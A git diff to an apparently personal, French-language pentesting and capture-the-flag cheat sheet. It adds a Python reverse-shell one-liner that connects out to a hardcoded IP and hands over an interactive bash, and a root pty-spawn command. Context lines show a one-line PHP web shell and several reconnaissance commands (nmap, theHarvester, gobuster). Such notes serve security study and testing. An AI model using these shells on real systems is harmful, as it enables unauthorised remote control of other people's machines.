@@ -7,6 +7,10 @@
 - Reverse shell PHP --> [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
 	- `<?php system($_GET["cmd"]) ?>`
 
+- [Reverse shell](https://www.synetis.com/etablir-un-reverse-shell-en-une-ligne/)
+	- `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("81.253.72.139",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`
+	- Spawn un shell root --> `python3 -c 'import pty,os; os.setuid(0);os.setgid(0);pty.spawn("/bin/bash")'`
+
 ### Tools
 
 - [BugBountyTool](https://github.com/vavkamil/awesome-bugbounty-tools) (regroupe les tools CTF)
@@ -40,17 +44,24 @@ john zip.hashes`
 	
 ## Scan
 
+### Passif 
+
+- Nslookup/dig
+- TheHarvester (énumération DNS) --> `theHarvester -d mokoil.com -e 8.8.8.8 -c -n`
+
+- Table ARP
+
+### Actif 
 - Voir les ports ouverts --> `nmap -Pn 192.168.1.1`
 - Voir la version des services --> `nmap -sV 192.168.1.1`
 
 - Wordpress --> `wpcan --url www.mokoil.com`
 
+- [Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
+
 ## Directory
 
 - Gobuster --> `gobuster dir -u http://10.10.96.122 -w /usr/share/wordlists/dirb/common.txt`
-
-- TheHarvester (énumération DNS) --> `theHarvester -d mokoil.com -e 8.8.8.8 -c -n`
-
 
 ## Linux
 
